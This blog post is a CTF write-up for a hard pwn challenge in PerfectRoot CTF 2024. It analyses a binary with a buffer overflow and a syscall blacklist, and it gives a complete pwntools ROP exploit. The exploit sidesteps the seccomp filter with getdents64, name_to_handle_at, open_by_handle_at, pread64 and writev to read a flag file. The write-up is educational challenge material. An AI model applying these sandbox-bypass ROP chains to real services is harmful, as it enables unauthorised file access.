---
layout: post
title: PerfectRoot Ctf 2024 - Pwn
date: 2025-02-04
categories:
  - Pwn
  - PerfectRoot
tags:
  - Linux
  - Seccomp
  - getdents
  - writev
  - pread64
  - name_to_handle_at
  - open_by_handle_at
  - Hard
image: "/images/Kumbavu_Zako/code.jpg"
author: "zerofrost"
draft: false
---

This challenge was one of the Pwn challenges created for [PerfectRoot Ctf 2024](https://ctf.perfectroot.wiki/). This challenge had a difficulty rating of `hard`.


### Challenge
For this challenge, we are provided with a 64-bit executable binary that is dynamically linked
```c
kumbavu_zako: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=d4f8e5e6dbb70d4298476c808c044928fb488cac, for GNU/Linux 3.2.0, not stripped
```

The binary also has the following protections with PIE being disabled.
![](/images/Kumbavu_Zako/Pasted_image_20260204105109.png)

Running the binary, we get the following menu
![](/images/Kumbavu_Zako/Pasted_image_20260204114438.png)

#### Ghidra
Checking the main function, we note that there is a buffer overflow where input of `640 bytes` is read into a buffer or size `64` bytes.
```c

undefined8 main(EVP_PKEY_CTX *param_1)

{
  char buffer [64];
  
  init(param_1);
  banner();
  FUN_004011a0("I\'m back again, casually serving top tier pain folks :)\n",1,0x38,stdout);
  waste();
  FUN_004011a0("Alright, gimme some: ",1,21,stdout);
  fgets(buffer,640,stdin);
  fu_seccomp();
  return 0;
}
```


Checking the `waste` function, we see that the program allows you to select a directory from the provided list and then calls `open(char *dirname,0x0,0x0)` on the directory ,returning an `fd` for it. 
```c

void waste(void)

{
  char *local_68 [4];
  char *local_48;
  char *local_40;
  char *local_38;
  char *local_30;
  char *local_28;
  char *local_20;
  int choice;
  int counter;
  
  FUN_004011a0("For whatever reason, choose any directory from the menu below:\n",1,0x3f,stdout);
  local_68[0] = "/";
  local_68[1] = "/etc";
  local_68[2] = "/home";
  local_68[3] = "/dev";
  local_48 = "/mnt";
  local_40 = "/opt";
  local_38 = "/sys";
  local_30 = "/proc";
  local_28 = "/var";
  local_20 = "/usr";
  for (counter = 0; counter < 10; counter = counter + 1) {
    printf("%d. %s\n",(ulong)(counter + 1),local_68[counter]);
  }
  printf("%","-> ");
  __isoc99_scanf("%2d",&choice);
  if ((choice < 1) || (10 < choice)) {
    while ((choice < 1 || (10 < choice))) {
      printf("%","That is not viable. Try again :)\n-> ");
      __isoc99_scanf("%2d",&choice);
    }
  }
  if (choice == 1) {
    syscall();
  }
  else if (choice == 2) {
    syscall();
  }
  else if (choice == 3) {
    syscall();
  }
  else if (choice == 4) {
    syscall();
  }
  else if (choice == 5) {
    syscall();
  }
  else if (choice == 6) {
    syscall();
  }
  else if (choice == 7) {
    syscall();
  }
  else if (choice == 8) {
    syscall();
  }
  else if (choice == 9) {
    syscall();
  }
  else if (choice == 10) {
    syscall();
  }
  getchar();
  return;
}

```

Checking the syscall function, we can confirm that it just opens the directory with `open(char *dirname,0x0,0x0)`
```c
c                                               XREF[1]:     0040150a(j)  
0040150c 48 8b 7c        MOV        RDI=>s_/etc_0040315a,qword ptr [RSP + local_60]  = "/home"
24 08
00401511 48 c7 c0        MOV        RAX,0x2
02 00 00 00
00401518 48 31 f6        XOR        RSI,RSI
0040151b 0f 05           SYSCALL
```

#### Seccomp
There is also a blacklist on syscalls 
```c
void fu_seccomp(void)
{
  undefined8 uVar1;
  
  uVar1 = seccomp_init(0x7fff0000);
  seccomp_rule_add(uVar1,0,0,0);
  seccomp_rule_add(uVar1,0,1,0);
  seccomp_rule_add(uVar1,0,2,0);
  seccomp_rule_add(uVar1,0,3,0);
  seccomp_rule_add(uVar1,0,9,0);
  seccomp_rule_add(uVar1,0,10,0);
  seccomp_rule_add(uVar1,0,0xb,0);
  seccomp_rule_add(uVar1,0,0x12,0);
  seccomp_rule_add(uVar1,0,0x13,0);
  seccomp_rule_add(uVar1,0,0x28,0);
  seccomp_rule_add(uVar1,0,0x38,0);
  seccomp_rule_add(uVar1,0,0x39,0);
  seccomp_rule_add(uVar1,0,0x3a,0);
  seccomp_rule_add(uVar1,0,0x3b,0);
  seccomp_rule_add(uVar1,0,0x142,0);
  seccomp_rule_add(uVar1,0,0x3e,0);
  seccomp_rule_add(uVar1,0,0x101,0);
  seccomp_rule_add(uVar1,0,0x1b5,0);
  seccomp_rule_add(uVar1,0,0x127,0);
  seccomp_rule_add(uVar1,0,0x128,0);
  seccomp_rule_add(uVar1,0,0x136,0);
  seccomp_rule_add(uVar1,0,0x137,0);
  seccomp_rule_add(uVar1,0,0x147,0);
  seccomp_rule_add(uVar1,0,0x148,0);
  seccomp_load(uVar1);
  seccomp_release(uVar1);
  return;
}
```

Using seccomp tools, we can find out which exact syscalls are blocked
```c
 line  CODE  JT   JF      K
=================================
 0000: 0x20 0x00 0x00 0x00000004  A = arch
 0001: 0x15 0x00 0x1c 0xc000003e  if (A != ARCH_X86_64) goto KILL
 0002: 0x20 0x00 0x00 0x00000000  A = sys_number
 0003: 0x35 0x00 0x01 0x40000000  if (A < 0x40000000) goto 0005
 0004: 0x15 0x00 0x19 0xffffffff  if (A != 0xffffffff) goto KILL
 0005: 0x15 0x18 0x00 0x00000000  if (A == read) goto KILL
 0006: 0x15 0x17 0x00 0x00000001  if (A == write) goto KILL
 0007: 0x15 0x16 0x00 0x00000002  if (A == open) goto KILL
 0008: 0x15 0x15 0x00 0x00000003  if (A == close) goto KILL
 0009: 0x15 0x14 0x00 0x00000009  if (A == mmap) goto KILL
 0010: 0x15 0x13 0x00 0x0000000a  if (A == mprotect) goto KILL
 0011: 0x15 0x12 0x00 0x0000000b  if (A == munmap) goto KILL
 0012: 0x15 0x11 0x00 0x00000012  if (A == pwrite64) goto KILL
 0013: 0x15 0x10 0x00 0x00000013  if (A == readv) goto KILL
 0014: 0x15 0x0f 0x00 0x00000028  if (A == sendfile) goto KILL
 0015: 0x15 0x0e 0x00 0x00000038  if (A == clone) goto KILL
 0016: 0x15 0x0d 0x00 0x00000039  if (A == fork) goto KILL
 0017: 0x15 0x0c 0x00 0x0000003a  if (A == vfork) goto KILL
 0018: 0x15 0x0b 0x00 0x0000003b  if (A == execve) goto KILL
 0019: 0x15 0x0a 0x00 0x0000003e  if (A == kill) goto KILL
 0020: 0x15 0x09 0x00 0x00000101  if (A == openat) goto KILL
 0021: 0x15 0x08 0x00 0x00000127  if (A == preadv) goto KILL
 0022: 0x15 0x07 0x00 0x00000128  if (A == pwritev) goto KILL
 0023: 0x15 0x06 0x00 0x00000136  if (A == process_vm_readv) goto KILL
 0024: 0x15 0x05 0x00 0x00000137  if (A == process_vm_writev) goto KILL
 0025: 0x15 0x04 0x00 0x00000142  if (A == execveat) goto KILL
 0026: 0x15 0x03 0x00 0x00000147  if (A == preadv2) goto KILL
 0027: 0x15 0x02 0x00 0x00000148  if (A == pwritev2) goto KILL
 0028: 0x15 0x01 0x00 0x000001b5  if (A == openat2) goto KILL
 0029: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 KILL: 0x06 0x00 0x00 0x00000000  return KILL
```


The list is quite similar to the syscall blacklist in the [Give Me](../../Imaginary/giveme/Give%20Me.md) challenge. From the list, we can find a few bypass syscalls that we can use [here](https://syscalls64.paolostivanin.com/):
* `pread64` instead of `read` -> `pread(int fd, void buf[count], size_t count,off_t offset);` -> `0x11`
* `writev` instead of `write` ->  `writev(int fd, const struct iovec *iov, int iovcnt);` -> `0x14`
* `getdents/getdents64` to list directory contents -> `getdents64(fd, void dirp[count], size_t count);` -> `0x4e`


The binary also has some interesting gadgets
```c
0x00000000004012a6 : pop r10 ; ret
0x00000000004012b1 : pop r15 ; ret
0x000000000040129a : pop rax ; ret
0x000000000040127d : pop rbp ; ret
0x000000000040129c : pop rdi ; ret
0x00000000004012a0 : pop rdx ; ret
0x000000000040129e : pop rsi ; ret
0x00000000004012b4 : syscall
0x0000000000401297 : mov dword ptr [rsi], edi ; ret
0x0000000000401296 : mov qword ptr [rsi], rdi ; ret
0x000000000040101a : ret
```

We also find several writeable regions in the binary
```c
gef➤  vmmap
[ Legend:  Code | Heap | Stack ]
Start              End                Offset             Perm Path
0x0000000000400000 0x0000000000401000 0x0000000000000000 r-- /opt/bitclan/kumbavu_zako/kumbavu_zako
0x0000000000401000 0x0000000000402000 0x0000000000001000 r-x /opt/bitclan/kumbavu_zako/kumbavu_zako
0x0000000000402000 0x0000000000404000 0x0000000000002000 r-- /opt/bitclan/kumbavu_zako/kumbavu_zako
0x0000000000404000 0x0000000000405000 0x0000000000003000 r-- /opt/bitclan/kumbavu_zako/kumbavu_zako
0x0000000000405000 0x0000000000406000 0x0000000000004000 rw- /opt/bitclan/kumbavu_zako/kumbavu_zako
0x0000000000406000 0x0000000000427000 0x0000000000000000 rw- [heap]
```

We can confirm if they are indeed writeable, and what they currently contain.
```c
gef➤  xinfo 0x405230
──────────────────────────────────────────── xinfo: 0x405230 ────────────────────────────────────────────
Page: 0x0000000000405000  →  0x0000000000406000 (size=0x1000)
Permissions: rw-
Pathname: kumbavu_zako
Offset (from page): 0x230
Inode: 1203752


gef➤  x/30gx 0x405230
0x405230:	0x0000000000000000	0x0000000000000000
0x405240:	0x0000000000000000	0x0000000000000000
0x405250:	0x0000000000000000	0x0000000000000000
0x405260:	0x0000000000000000	0x0000000000000000
0x405270:	0x0000000000000000	0x0000000000000000
0x405280:	0x0000000000000000	0x0000000000000000
0x405290:	0x0000000000000000	0x0000000000000000
0x4052a0:	0x0000000000000000	0x0000000000000000
0x4052b0:	0x0000000000000000	0x0000000000000000
0x4052c0:	0x0000000000000000	0x0000000000000000
0x4052d0:	0x0000000000000000	0x0000000000000000
0x4052e0:	0x0000000000000000	0x0000000000000000
0x4052f0:	0x0000000000000000	0x0000000000000000
0x405300:	0x0000000000000000	0x0000000000000000
0x405310:	0x0000000000000000	0x0000000000000000

```


#### Getdents - Listing Files 
Since an `fd` to a directory of our choosing is returned i.e `3`, we can use `sys_getdents/sys_getdents64` to list files in the directory. The parameters  for the syscall are as follows
```c
ssize_t getdents64(fd, void dirp[count], size_t count);
where dirp is a writeable area where the entries will be stored, and count is the number of entries
```

Using this we can write a rop chain to fetch the directory contents
```python
writeable_addr=0x405230
payload=b''
payload=b'A' * offset
payload+=p64(pop_rdi)
payload+=p64(0x3) # set fd
payload+=p64(pop_rsi)
payload+=p64(writeable_addr) # set writeable region
payload+=p64(pop_rdx)
payload+=p64(0x1000) # set the count
payload+=p64(pop_rax)
payload+=p64(0x4e)# set syscall
payload+=p64(syscall)
target.sendlineafter(b': ',payload)
```

Checking the writeable region in GDB, we see that we got the listings of the opened directory.
![](/images/Kumbavu_Zako/Pasted_image_20260204111656.png)

#### Writev
We can now print the contents by writing another ropchain that utilizes `writev`. However to use `writev`, we first have to setup an `iovec` struct
```c
// ssize_t readv(int fd, const struct iovec *iov, int iovcnt);


char          *str0 = "hello ";
struct iovec  iov[2];

iov[0].iov_base = str0; // the base stores the string to print
iov[0].iov_len = strlen(str0); // the len stores the length of the string to print
```


We need to find another writeable region for the `iovec` struct. For this I chose the heap region which is also writeable. To avoid tampering with heap metadata, I chose the address at `0x30` from the `heap base`
```python
heap_addr=iovec_addr=0x406000+0x30 # 0x406030

# setup iovec_addr(base) to point to the location of the buffer to print 
# i.e iovec_addr -> writeable_addr
payload+=p64(pop_rdi)
payload+=p64(writeable_addr)
payload+=p64(pop_rsi)
payload+=p64(iovec_addr)
payload+=p64(mov_qword_ptr_rsi_rdi) # mov qword ptr [rsi], rdi; ret;

# setup iovec_addr(len) -> length of the buffer to print
# i.e iovec_addr+8 -> writeable_addr_len
payload+=p64(pop_rdi)
payload+=p64(0x200) # length to print
payload+=p64(pop_rsi)
payload+=p64(iovec_addr+8) # write to the next 8 bytes
payload+=p64(mov_qword_ptr_rsi_rdi) # mov qword ptr [rsi], rdi; ret;


# Now call writev
payload+=p64(pop_rdi)
payload+=p64(0x1) # write to stdout
payload+=p64(pop_rsi)
payload+=p64(iovec_addr) # iovec struct arr
payload+=p64(pop_rdx)
payload+=p64(0x1) # len of iovec struct arr
payload+=p64(pop_rax)
payload+=p64(0x14)# set syscall
payload+=p64(syscall)
```

After sending the payload, we get back a list of files in the selected directory, along with some junk data.

![](/images/Kumbavu_Zako/Pasted_image_20260204114258.png)


With this information, we can now proceed to the next step wich is reading the flag.

### Exploit
#### name_to_handle_at
Previously, we saw that the program allows us to open and get an `fd` to any directory of our choosing using `open(char *dirname,0x0,0x0)`. However, our goal is to open and read a file. Since `open/openat/openat2` etc are all blocked, we need to find another way to get an `fd` to a file.

The [name_to_handle_at()](https://man7.org/linux/man-pages/man2/name_to_handle_at.2.html) system call returns a file handle and a mount ID corresponding to the file specified by the dirfd and path arguments.  The file handle is returned via the argument handle, which is a pointer to a structure of the following form:
```c
     struct file_handle {
               unsigned int  handle_bytes;   /* 4-bytes , Size of f_handle [in, out] */
               int           handle_type;    /* 4- bytes, Handle type [out] */
               unsigned char f_handle[0];    /* File identifier (sized by
                                                caller) [out] */
           };
```

The `name_to_handle_at` syscall takes the following parameters
```c
int name_to_handle_at(int dirfd, const char *path,struct file_handle *handle,int *mount_id, int flags);

// we need to set the following values, 
int name_to_handle_at(0x3, *flag_file,struct file_handle *handle,int *mount_id, 0x0);
```


Below is the python code to create a ropchain that calls `name_to_handle_at`
```python
# Find region in heap where we can write stuff
pathname=0x405240
handle_addr=pathname+0x30 # 0x405270
mount_id_addr=handle_addr+0x30 # 0x4052a0
iovec_struct_addr=mount_id_addr+0x30 

# First setup a write what where function
def write_what_where(what,where):
	payload=b''
	payload+=p64(pop_rdi)
	payload+=p64(what) # push null byte
	payload+=p64(pop_rsi)
	payload+=p64(where)
	payload+=p64(mov_qword_ptr_rsi_rdi) # mov qword ptr [rsi], rdi; ret;
	return payload


# int name_to_handle_at(int dirfd, const char *path,struct file_handle *handle,int *mount_id, int flags);
def name_to_handle_at():
	payload=b''
	# First store filename as a pointer
	payload+=write_what_where(0x7478742e67616c66,pathname) # write flag.txt to writeable aread
	payload+=write_what_where(0x0,pathname+8) # write null byte for flag.txt
	# now $rsi   : 0x0000000000405238  →  "flag.txt"



	# STEP 2: Initialize file_handle struct 
	# struct file_handle {
	#	 unsigned int handle_bytes;  // 4 bytes
	#	 int handle_type;			// 4 bytes  
	#	 unsigned char f_handle[];   // Variable
	# }

	# write handle_bytes
	payload+=write_what_where(128,handle_addr)
	
	# write handle_type (NOT NEEDED SINCE THE REGION HAD A BUNCH ON NULL BYTES)
	# payload+=write_what_where(0x0,handle_addr+4)



	# call name_to_handle_at(int dirfd, const char *path,struct file_handle *handle,int *mount_id, int flags);
	payload+=p64(pop_rdi)
	payload+=p64(0x3) # dirfd
	
	payload+=p64(pop_rsi)
	payload+=p64(pathname) # char path

	payload+=p64(pop_rdx)
	payload+=p64(handle_addr) # handle addr

	payload+=p64(pop_r8_r9_r10)
	payload+=p64(0x0) # r8 -> flags
	payload+=p64(0x1337) # r9 -> junk(not needed)
	payload+=p64(mount_id_addr) # r10 -> mountid(where the mount id will be written on success)
	
	payload+=p64(pop_rax) 
	payload+=p64(0x12f) 
	payload+=p64(syscall)
	return payload
```

> `name_to_handle_at` returns `0x0` when successful



#### open_by_handle_at
Now that we have an `fd` to the flag file, we need to open it for reading. The only `*open*` syscall that we can use now is [open_by_handle_at](https://man7.org/linux/man-pages/man2/open_by_handle_at.2.html). 

The `name_to_handle_at()` and `open_by_handle_at()` system calls split the functionality of `openat(2)` into two parts: name_to_handle_at() returns an opaque handle that corresponds to a specified file; `open_by_handle_at()` opens the file corresponding to a handle returned by a previous call to `name_to_handle_at()` and returns an open file descriptor. 

> I discovered that for `open_by_handle_at` to work, you need to run the program as `root` or assign it capabilities e.g `sudo setcap cap_dac_read_search+ep ./test` , otherwise it returns `-1 = EPERM (Operation not permitted)`
> The caller must have the **CAP_DAC_READ_SEARCH** capability to invoke **open_by_handle_at**()

The format for the syscall is as follows
```c
int open_by_handle_at(int mount_fd, struct file_handle *handle,int flags);

// we need to set the following values
int open_by_handle_at(0x3, handle_we_used_in_name_to_handle_at,0x0);

int open_by_handle_at(0x3, handle_addr,0x0);
```

The ropchain is as follows
```python
# int open_by_handle_at(int mount_fd, struct file_handle *handle,int flags);
def open_by_handle_at():
	payload=b''
	payload+=p64(pop_rdi) 
	payload+=p64(3) # mount_fd, we could also try -100 if we are in that directory
	
	payload+=p64(pop_rsi) 
	payload+=p64(handle_addr) # handle_addr
	
	payload+=p64(pop_rdx) 
	payload+=p64(0x0) # flags
	
	payload+=p64(pop_rax) 
	payload+=p64(0x130) # flags
	
	payload+=p64(syscall) 
	return payload	
```

> This returns an fd of `0x4` which is the next fd after `stdin(0x0),stdout(0x1),stderr(0x2),our_dir_fd(0x3)`

#### pread64
With the `flag` file opened, we can read its contents using [pread64](https://man7.org/linux/man-pages/man2/pread64.2.html) which is an allowed syscall.

```c
ssize_t pread(int fd, void buf, size_t count,off_t offset);

// we need to set the following values
ssize_t pread(0x4, void addr_to_store_the_flag, size_t count,off_t offset);

// We can reuse memory addresses we don't need e.g pathname
ssize_t pread(0x4, void pathname, 0x100,0x0);
```


The ropchain is as follows
```python
# ssize_t pread64(int fd, void *buf, size_t count, off_t offset);
def pread64():
	payload=b''
	payload+=p64(pop_rdi) 
	payload+=p64(0x4) # new fd returned by open_by_handle_at 
	payload+=p64(pop_rsi) # new fd returned by open_by_handle_at 
	payload+=p64(pathname) # where to store the flag, reuse pathname addr 
	payload+=p64(pop_rdx) 
	payload+=p64(0x100) # size to read 
	payload+=p64(pop_r10) 
	payload+=p64(0x0) # offset
	payload+=p64(pop_rax) 
	payload+=p64(0x11) # 
	payload+=p64(syscall) 
	return payload
```

This will return the length of the flag.

![](/images/Kumbavu_Zako/Pasted_image_20260204153952.png)


#### writeve
Finally, with the flag in a know memory address, we can write it out to stdout using [writev](https://man7.org/linux/man-pages/man2/writev.2.html)

```c
ssize_t writev(int fd, const struct iovec *iov, int iovcnt);


writev(int fd<stdout>, const struct iovec *iov, int iovcnt);
writev(1, const struct iovec *iov, 1);
// where
# iov[0].iov_base = address containing flag
# iov[0].iov_len = length of the flag

```

Below is the ropchain for writev
```c
pathname=0x405240
handle_addr=pathname+0x30 # 0x405270
mount_id_addr=handle_addr+0x30 # 0x4052a0

# Find a suitable writeable region for our iovec struct
iovec_struct_addr=mount_id_addr+0x30 

# ssize_t writev(int fd, const struct iovec *iov, int iovcnt);
def writeve():
	payload=b''

	# set struct iovec base -> buffer to print
	payload+=write_what_where(pathname,iovec_struct_addr) # where pathname is a pointer to the flag.
	
	# set struct iovec len -> len(buffer) to print
	payload+=write_what_where(0x100,iovec_struct_addr+8) # where 0x100 is a bytes to print.

	# call writev(int fd, const struct iovec *iov, int iovcnt);
	payload+=p64(pop_rdi)  
	payload+=p64(0x1) # set fd to stdout

	payload+=p64(pop_rsi)  
	payload+=p64(iovec_struct_addr) # pointer to struct

	payload+=p64(pop_rdx)
	payload+=p64(0x1) # number of array

	payload+=p64(pop_rax)
	payload+=p64(0x14)
	payload+=p64(syscall)
	# payload+=p64(0xdeadbeef)

	return payload

```


#### Final exploit
Below is the final exploit to read the flag.
```python
#! /usr/bin/python3
from pwn import *
context.update(arch='amd64',os='linux')
context.binary=e=elf=ELF("kumbavu_zako",checksec=False)
context.log_level='critical'
target=process()

# Gadgets
pop_rax= 0x000000000040129a#: pop rax; ret;
pop_rdi= 0x000000000040129c#: pop rdi; ret; 
pop_rsi= 0x000000000040129e#: pop rsi; ret;
pop_r10=0x00000000004012a6#: pop r10; ret;
pop_rdx= 0x00000000004012a0#: pop rdx; ret; 
syscall=0x00000000004012b4# : syscall; 
pop_r8_r9_r10=0x00000000004012a2#: pop r8; pop r9; pop r10; ret; 
mov_qword_ptr_rsi_rdi = 0x0000000000401296#: mov qword ptr [rsi], rdi; ret;

# Find region in heap where we can write stuff
offset=72
pathname=0x405240 # store strings such as filename/flag
handle_addr=pathname+0x30 # 0x405270
mount_id_addr=handle_addr+0x30 # 0x4052a0
iovec_struct_addr=mount_id_addr+0x30 

# First setup a write what where function
def write_what_where(what,where):
	payload=b''
	payload+=p64(pop_rdi)
	payload+=p64(what) # push null byte
	payload+=p64(pop_rsi)
	payload+=p64(where)
	payload+=p64(mov_qword_ptr_rsi_rdi) # mov qword ptr [rsi], rdi; ret;
	return payload


# int name_to_handle_at(int dirfd, const char *path,struct file_handle *handle,int *mount_id, int flags);
def name_to_handle_at():
	payload=b''
	payload+=write_what_where(0x7478742e67616c66,pathname) # write flag.txt to writeable area
	payload+=write_what_where(0x0,pathname+8) # write null byte for flag.txt
	payload+=write_what_where(128,handle_addr) # write handle_bytes
	# payload+=write_what_where(0x0,handle_addr+4) # write handle_type (NOT NEEDED SINCE THE REGION HAD A BUNCH ON NULL BYTES)
	
	# call name_to_handle_at(int dirfd, const char *path,struct file_handle *handle,int *mount_id, int flags);
	payload+=p64(pop_rdi)
	payload+=p64(0x3) # dirfd
	payload+=p64(pop_rsi)
	payload+=p64(pathname) # char path
	payload+=p64(pop_rdx)
	payload+=p64(handle_addr) # handle addr
	payload+=p64(pop_r8_r9_r10)
	payload+=p64(0x0) # r8 -> flags
	payload+=p64(0x1337) # r9 -> junk(not needed)
	payload+=p64(mount_id_addr) # r10 -> mountid(where the mount id will be written on success)
	payload+=p64(pop_rax) 
	payload+=p64(0x12f) 
	payload+=p64(syscall)
	return payload


# int open_by_handle_at(int mount_fd, struct file_handle *handle,int flags);
def open_by_handle_at():
	payload=b''
	payload+=p64(pop_rdi) 
	payload+=p64(3) # mount_fd, we could also try -100 if we are in that directory
	
	payload+=p64(pop_rsi) 
	payload+=p64(handle_addr) # handle_addr
	
	payload+=p64(pop_rdx) 
	payload+=p64(0x0) # flags
	
	payload+=p64(pop_rax) 
	payload+=p64(0x130) # flags
	
	payload+=p64(syscall) 
	return payload	


# ssize_t pread64(int fd, void *buf, size_t count, off_t offset);
def pread64():
	payload=b''
	payload+=p64(pop_rdi) 
	payload+=p64(0x4) # new fd returned by open_by_handle_at 
	payload+=p64(pop_rsi) # new fd returned by open_by_handle_at 
	payload+=p64(pathname) # where to store the flag, reuse pathname addr 
	payload+=p64(pop_rdx) 
	payload+=p64(0x100) # size to read 
	payload+=p64(pop_r10) 
	payload+=p64(0x0) # offset
	payload+=p64(pop_rax) 
	payload+=p64(0x11) # 
	payload+=p64(syscall) 
	return payload


# ssize_t writev(int fd, const struct iovec *iov, int iovcnt);
def writeve():
	payload=b''
	payload+=write_what_where(pathname,iovec_struct_addr) # set iov[0].iov_base , where pathname is a pointer to the flag.
	payload+=write_what_where(0x100,iovec_struct_addr+8) # set iov[0].iov_len , where 0x100 is a bytes to print.

	# call writev(int fd, const struct iovec *iov, int iovcnt);
	payload+=p64(pop_rdi)  
	payload+=p64(0x1) # set fd to stdout
	payload+=p64(pop_rsi)  
	payload+=p64(iovec_struct_addr) # pointer to struct
	payload+=p64(pop_rdx)
	payload+=p64(0x1) # number of array
	payload+=p64(pop_rax)
	payload+=p64(0x14)
	payload+=p64(syscall)
	return payload

payload=b''
payload=b'A' * offset
print(f'[*] Getting handle to flag file via name_to_handle_at()')
payload+=name_to_handle_at()
print(f'[*] Opening flag file via open_by_handle_at()')
payload+=open_by_handle_at()
print(f'[*] Reading flag file via pread64()')
payload+=pread64()
print(f'[*] Fetching flag via writev()')
payload+=writeve()

target.sendlineafter(b'-> ',b'3') # pick directory
target.sendlineafter(b': ',payload)

flag=target.recvuntil(b'\x00')[:-1].decode()
print(f'[+] FLAG: {flag}')
```
![](/images/Kumbavu_Zako/Pasted_image_20260204155945.png)



### References
#### Test File
```c
#define _GNU_SOURCE
#include <fcntl.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <unistd.h>
#include <stdio.h>
#include <stdlib.h>
#include <errno.h>
#include <string.h>

#ifndef MAX_HANDLE_SZ
#define MAX_HANDLE_SZ 128
#endif

int main(void) {
    int mount_fd = open("/", O_RDONLY | O_DIRECTORY);
    if (mount_fd < 0) {
        perror("open /");
        return 1;
    }

    struct file_handle *handle = malloc(sizeof(*handle) + MAX_HANDLE_SZ);
    if (!handle) {
        close(mount_fd);
        return 1;
    }
    handle->handle_bytes = MAX_HANDLE_SZ;
    int flags = 0;

    if (name_to_handle_at(mount_fd, "flag.txt", handle, &flags, 0) < 0) {
        perror("name_to_handle_at");
        free(handle); 
        close(mount_fd); 
        return 1;
    }

    int file_fd = open_by_handle_at(mount_fd, handle, O_RDONLY);
    free(handle);
    if (file_fd < 0) { 
        perror("open_by_handle_at");
        close(mount_fd); 
        return 1; 
    }

    char buf[1024];
    ssize_t nread = read(file_fd, buf, sizeof(buf)-1);
    if (nread < 0) {
        perror("read");
    } else if (nread > 0) {
        buf[nread] = 0;
        write(STDOUT_FILENO, buf, nread);
    } else {
        printf("File is empty\n");
    }

    close(file_fd);
    close(mount_fd);
    return 0;
}   
```